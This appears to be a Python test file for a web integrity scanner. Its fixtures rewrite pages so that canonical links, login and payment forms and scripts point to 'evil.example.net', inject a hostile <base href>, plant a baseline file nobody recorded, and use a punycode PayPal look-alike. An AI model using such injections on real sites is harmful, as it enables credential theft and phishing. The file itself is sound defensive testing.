"""Curmudgeon's script tests, part 8: batches 2 and 3 of the ultimate audit of 30 Oct 2026 (03 §5.57): the browser
integrity lens, then the stop gates and the change map. Run plugin/tests/run_tests.py, which defines the helpers and
runs every part. Not runnable on its own. Each test here failed on the code before its fix."""

G8 = ["git", "-c", "user.email=t@example.invalid", "-c", "user.name=t"]

def _irows(d, sev=None):
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    return sorted((x["rule"], x["where"]) for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"]
                  if x["area"] == "integrity" and (sev is None or x["sev"] == sev))

SRI8 = 'integrity="sha384-Zm9vYmFyYmF6Zm9vYmFyYmF6Zm9vYmFy"'

@test("audit F-9c12cea5: a page that names a new site as its own (canonical, og:url) can't make that site's form or script count as unchanged against the recorded copy")
def _(d):
    page = '<link rel="canonical" href="https://www.example.com/">\n<form action="/pay"></form>\n<script src="/app.js"></script>\n'
    write(d, "site/index.html", page)
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=d); assert r.returncode == 0, r.stderr
    write(d, "site/index.html", '<link rel="canonical" href="https://evil.example.net/">\n<form action="https://evil.example.net/pay"></form>\n'
                                f'<script src="https://evil.example.net/x.js" {SRI8}></script>\n')
    got = _irows(d, "FAIL")
    assert ("integrity-changed", "site/index.html:2") in got and ("integrity-new-origin", "site/index.html:3") in got, got
    assert ("integrity-changed", "site/index.html:1") in got, ("the page now claims to be another site", got)

@test("audit F-5a56b49c: <base href> to another site is not the page's own site, and relative form, script and link targets resolve against it")
def _(d):
    page = ('<link rel="canonical" href="https://www.example.com/">\n<base href="https://evil.example.net/">\n'
            '<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    write(d, "site/index.html", page)
    got = _irows(d)
    assert ("integrity-form-offsite", "site/index.html:3") in got and ("integrity-script-no-sri", "site/index.html:4") in got, got
    e = d / "e"; write(e, "site/index.html", '<link rel="canonical" href="https://www.example.com/">\n<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=e)
    write(e, "site/index.html", '<link rel="canonical" href="https://www.example.com/">\n<base href="https://evil.example.net/">\n<form action="/login"></form>\n<script src="/app.js"></script>\n<a href="/help">Help</a>\n')
    got = _irows(e, "FAIL")
    assert {("integrity-changed", "site/index.html:3"), ("integrity-new-origin", "site/index.html:4"), ("integrity-changed", "site/index.html:5")} <= set(got), got

@test("audit Q04: a recorded copy the owner didn't record or adopt on this machine (shipped, git-tracked, edited) is never compared against, and only the owner can adopt one")
def _(d):
    page = f'<script src="https://cdn.example.net/x.js" {SRI8}></script>\n'
    write(d, "site/index.html", page)
    planted = {"recorded": "2026-10-01", "files": {"site/index.html": {"links": [], "forms": [], "origins": ["example.net"]}}}
    write(d, ".critic/integrity-baseline.json", json.dumps(planted))
    write(d, "site/index.html", page + f'<script src="https://cdn.example.org/y.js" {SRI8}></script>\n')
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    rows = [x for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" and "this machine" in x["what"] for x in rows), rows
    r = run(S / "critic_scan.py", ".", "--root", ".", "--integrity-adopt", cwd=d); assert r.returncode == 0 and "example.net" in r.stdout, r.stdout + r.stderr
    got = _irows(d, "FAIL"); assert ("integrity-new-origin", "site/index.html:2") in got, ("adopted by the owner, it is compared against", got)
    bp = d / ".critic/integrity-baseline.json"; bp.write_text(bp.read_text().replace("example.net", "example.org"))
    run(S / "critic_scan.py", ".", "--root", ".", cwd=d)
    rows = [x for x in json.loads((d / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" for x in rows) and not any(x["rule"] == "integrity-new-origin" for x in rows), ("edited after adoption: not trusted", rows)
    g = d / "g"; write(g, "site/index.html", page); subprocess.run(["git", "init", "-q"], cwd=g)
    run(S / "critic_scan.py", ".", "--root", ".", "--integrity-record", cwd=g)
    subprocess.run(["git", "add", "-f", "."], cwd=g); subprocess.run(G8 + ["commit", "-qm", "ship it"], cwd=g)
    run(S / "critic_scan.py", ".", "--root", ".", cwd=g)
    rows = [x for x in json.loads((g / ".critic/scan/report.json").read_text())["findings"] if x["area"] == "integrity"]
    assert any(x["rule"] == "integrity-baseline-unread" for x in rows), ("git tracks it: it could have come with the code", rows)
    sys.path.insert(0, str(H)); import importlib, read_guard as rg8; importlib.reload(rg8)
    for cmd in (f"python3 {S}/critic_scan.py . --root . --integrity-adopt", f"python3 {S}/critic_scan.py . --integrity-record"):
        assert rg8.owner_problem(cmd, True), ("an agent can't bless the recorded copy", cmd)

@test("audit F-e55d7809: a Japanese, Chinese or Korean host that mixes its own scripts (Han with Hiragana or Katakana, Han with Hangul) is not a look-alike; Latin with Cyrillic still is")
def _(d):
    page = ('<a href="https://東京ばな奈.jp/">Tokyo</a>\n<a href="https://ソニー銀行.jp/">Bank</a>\n<a href="https://한국大學.kr/">Uni</a>\n'
            '<a href="https://ラーメン.jp/">Ramen</a>\n<a href="https://xn--pypal-4ve.com/">Pay</a>\n')
    write(d, "site/index.html", page)
    got = [x for x in _irows(d) if x[0] == "integrity-lookalike-host"]
    assert got == [("integrity-lookalike-host", "site/index.html:5")], got
